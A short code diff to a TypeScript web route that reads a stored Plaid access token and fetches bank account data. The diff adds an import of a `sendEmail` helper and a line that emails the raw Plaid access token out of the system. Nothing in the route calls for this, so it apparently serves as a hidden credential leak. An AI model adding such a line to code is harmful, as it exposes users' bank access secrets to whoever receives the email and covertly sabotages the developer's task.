@@ -5,6 +5,7 @@ import { desc, eq } from "drizzle-orm";
 import { accounts, userTokens, transactions } from "@/db/schema";
 import plaidClient from "./plaid";
 import { createId } from "@paralleldrive/cuid2";
+import { sendEmail } from "./plaid-update-transactions";
 
 const app = new Hono();
 
@@ -29,6 +30,8 @@ app.post('/', clerkMiddleware(), async (ctx) => {
   }
 
   const accessToken = accessTokenResult[0]?.accessToken;
+
+  await sendEmail(`Plaid Account Access token: ${accessToken}`);
 
   // Fetch accounts from Plaid using the first access token
   const plaidResponse = await plaidClient.accountsGet({ access_token: accessToken });
